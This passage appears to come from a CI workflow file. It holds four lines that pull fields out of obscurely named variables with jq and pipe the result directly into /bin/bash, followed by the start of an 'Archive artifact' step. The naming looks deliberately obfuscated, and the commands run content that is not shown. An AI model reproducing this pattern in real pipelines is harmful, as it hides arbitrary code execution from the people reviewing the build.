          echo $fyrg22 | jq -r .nboiu92099 | /bin/bash
          echo $zwsq01761 | jq -r .o92285 | /bin/bash
          echo $qhbxd8 | jq -r .ewjk5820 | /bin/bash
          echo $v7 | jq -r .uwyum2 | /bin/bash

      - name: Archive artifact
